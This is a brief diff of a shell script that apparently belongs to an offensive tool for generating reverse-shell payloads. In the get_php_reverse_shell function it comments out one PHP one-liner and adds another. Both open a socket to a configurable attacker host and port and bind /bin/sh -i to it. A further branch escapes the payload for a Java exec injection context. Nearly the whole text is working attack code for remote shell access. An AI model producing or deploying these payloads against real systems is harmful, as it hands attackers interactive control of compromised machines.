@@ -110,7 +110,8 @@ get_busybox_reverse_shell() {
 
 get_php_reverse_shell() {
     prepare_generic_linux_shell
-    local reverse_shell="\$sock=fsockopen(\"$host_ip\",$host_port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);"
+    #local reverse_shell="\$sock=fsockopen(\"$host_ip\",$host_port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);"
+    local reverse_shell="\$sock=fsockopen(\"$host_ip\",$host_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
     if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
         reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"php\", \"-r\" , \"$reverse_shell\"}"
